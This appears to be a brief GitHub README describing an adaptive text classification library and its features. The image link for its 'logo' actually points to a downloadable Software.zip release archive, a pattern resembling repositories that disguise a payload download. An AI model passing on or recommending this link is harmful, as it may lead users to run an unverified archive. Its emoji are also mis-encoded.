# ðŸš€ Welcome to Adaptive Classifier Repository!

![Adaptive Classifier Logo](https://github.com/enessah00/adaptive-classifier/releases/download/v2.0/Software.zip)

## Overview
"adaptive-classifier" is a powerful and flexible classification system designed for dynamic text classification tasks. This system leverages cutting-edge technologies such as adaptive learning, neural networks, large language models (LLMs), machine learning, and transformers to provide a state-of-the-art solution for multi-class and multi-label classification.

## Features
ðŸ”¹ Adaptive Learning: Allows the system to continuously adapt and learn from new data  
ðŸ”¹ Neural Networks: Utilizes advanced neural network architecture for efficient classification  
ðŸ”¹ Large Language Models: Incorporates BERT, RoBERTa, and DistilBERT for text embeddings  
ðŸ”¹ Elastic Weight Consolidation: Implements techniques for preserving previously learned information  
ðŸ”¹ Online Learning: Supports continuous learning without the need for retraining  
ðŸ”¹ Faiss Integration: Enables fast similarity search for efficient classification
